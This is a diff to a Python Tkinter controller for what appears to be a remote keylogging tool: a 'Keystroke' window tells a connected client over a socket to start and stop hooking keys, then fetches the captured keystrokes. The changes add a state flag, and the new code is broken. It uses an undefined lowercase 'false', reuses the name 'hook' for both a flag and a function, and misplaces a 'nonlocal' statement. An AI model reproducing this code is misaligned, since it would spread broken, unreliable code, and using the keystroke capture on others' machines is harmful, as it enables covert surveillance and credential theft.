@@ -356,25 +356,30 @@ def Keystroke():
     size = 0
     string = ''
     newApp = Tk()
-    #newApp.geometry("500x300")
+    newApp.geometry("500x300")
     newApp.title("Keystroke")  
-    e = Entry(newApp, width = 55)
+    e = Entry(newApp, width = 55,)
     e.grid(row = 1, column = 0,columnspan= 4)
     unhook_press = False
+    hook = false
     def hook():
-        nonlocal unhook_press
+        nonlocal unhook_press, hook
+        hook = True
         unhook_press = False
         client.sendall(bytes("Hook Key","utf8"))
         check = client.recv(1024).decode("utf8")
     def unhook():
-        nonlocal size, string, unhook_press
-        client.sendall(bytes("Unhook Key","utf8"))       
-        size , string = Recieve_Hook(client, HOST, PORT)
-        
-        if unhook_press == False:
-            client.sendall(bytes("Unhook Key","utf8"))
+        nonlocal hook
+        if hook == True:
+            nonlocal size, string, unhook_press
+            client.sendall(bytes("Unhook Key","utf8"))       
             size , string = Recieve_Hook(client, HOST, PORT)
-            unhook_press = True
+            
+            if unhook_press == False:
+                client.sendall(bytes("Unhook Key","utf8"))
+                size , string = Recieve_Hook(client, HOST, PORT)
+                unhook_press = True
+            hook = False
     def xem():
         nonlocal size, string, unhook_press
         if unhook_press == False: 
